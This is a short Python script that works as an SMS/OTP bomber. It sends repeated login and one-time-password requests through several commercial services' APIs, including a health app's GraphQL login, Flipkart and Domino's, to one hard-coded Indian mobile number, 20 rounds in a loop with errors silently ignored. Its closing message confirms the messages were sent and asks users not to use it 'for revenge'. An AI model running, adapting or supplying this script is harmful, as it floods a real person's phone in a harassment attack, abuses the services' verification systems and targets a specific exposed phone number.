import requests
import time
import data

def main(num):
	
	for i in range(20):
		try:
			requests.post(data.apollo_url ,json={"operationName":"Login","variables":{"mobileNumber":"+91"+str(num),"loginType":"PATIENT","hashCode":"XZNKZ3TUKDO"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!, $hashCode: String) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType, hashCode: $hashCode) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n"}  ,headers=data.apollo_headers)
			time.sleep(0.3)
			requests.post(data.snapdeal_url)
			time.sleep(0.3)
			requests.post(data.flipkart_url,json=data.flipkart_json,headers=data.flipkart_headers)
			time.sleep(0.3)
			requests.post(data.dominos_url,json=data.dominos_json,headers=data.dominos_headers)
			time.sleep(0.3)
			requests.post(data.owenstr_url,json=data.owenstr_json,headers=data.owenstr_headers)


		except Exception as e:
			pass
			
	return '50 Sent succesfully\nPlease dont use it for revenge purposes'
	

		
print(main('8977570270'))		
		

	